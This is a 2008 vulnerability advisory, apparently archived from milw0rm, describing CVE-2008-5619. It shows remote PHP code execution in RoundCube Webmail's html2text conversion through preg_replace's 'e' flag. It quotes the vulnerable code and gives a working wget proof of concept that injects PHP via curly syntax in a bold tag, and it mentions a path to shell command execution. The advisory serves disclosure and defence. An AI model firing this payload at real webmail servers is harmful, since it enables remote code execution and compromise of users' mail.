<html><head><title>RoundCube Webmail <= 0.2-3 beta Code Execution Vulnerability</title></head><pre>Public Release Date of POC: 2008-12-22
Author: Jacobo Avariento Gimeno (Sofistic)
CVE id: CVE-2008-5619
Bugtraq id: 32799
Severity: Critical
Vulnerability reported by: RealMurphy


Intro
----
Roundcube Webmail is a browser-based IMAP client that uses
&quot;chuggnutt.com HTML to Plain Text Conversion&quot; library to convert
HTML text to plain text, this library uses the preg_replace PHP
function in an insecure manner.

Vulnerable versions:
Round Cube RoundCube Webmail 0.2-3 beta
Round Cube RoundCube Webmail 0.2-1 alpha (tested)


Analysis of the vulnerable code
----
The script bin/html2text.php creates an instance of the class html2text
with the given POST data, the problem arises in the file
program/lib/html2text.php in function _convert() on line 381:

        // Run our defined search-and-replace
        $text = preg_replace($this-&gt;search, $this-&gt;replace, $text);

Some patterns in $this-&gt;search allow interpret PHP code using the &quot;e&quot;
flag, i.e.:
'/&lt;a [^&gt;]*href=(&quot;|\')([^&quot;\']+)\1[^&gt;]*&gt;(.+?)&lt;\/a&gt;/ie', // &lt;a href=&quot;&quot;&gt;
'/&lt;b[^&gt;]*&gt;(.+?)&lt;\/b&gt;/ie',                // &lt;b&gt;
'/&lt;th[^&gt;]*&gt;(.+?)&lt;\/th&gt;/ie',              // &lt;th&gt; and &lt;/th&gt;

In concrete those would be replaced by:
'$this-&gt;_build_link_list(&quot;\\2&quot;, &quot;\\3&quot;)', // &lt;a href=&quot;&quot;&gt;
'strtoupper(&quot;\\1&quot;)',                    // &lt;b&gt;
&quot;strtoupper(\&quot;\t\t\\1\n\&quot;)&quot;,            // &lt;th&gt; and &lt;/th&gt;

Now using PHP complex (curly) syntax we can take advantage of this to
interpret arbitrary PHP code, evaluating PHP code embedded inside
strings.


Proof of Concept
----
As this vulnerability was discovered in-the-wild:
http://trac.roundcube.net/ticket/1485618 was quite sure that would be
exploitable, using PHP curly we can execute phpinfo():

wget -q --header=&quot;Content-Type: ''&quot; \
-O - --post-data='&lt;b&gt;{${phpinfo()}}&lt;/b&gt;' \
--no-check-certificate \
http://127.0.0.1/roundcubemail-0.2-alpha/bin/html2text.php

Using PHP curly syntax plus some tricks to bypass PHP magic_quotes_gpc
to avoid using single or double quotes the arbitrary shell command
execution is fully feasible. As this vulnerability was discovered last
week no more details will be published yet, more info will be available
at http://sofistic.net.



-- Jacobo Avariento Gimeno IT Security Department @ Sofistic Your security, our concern! http://sofistic.net 

# milw0rm.com [2008-12-22]</pre></html>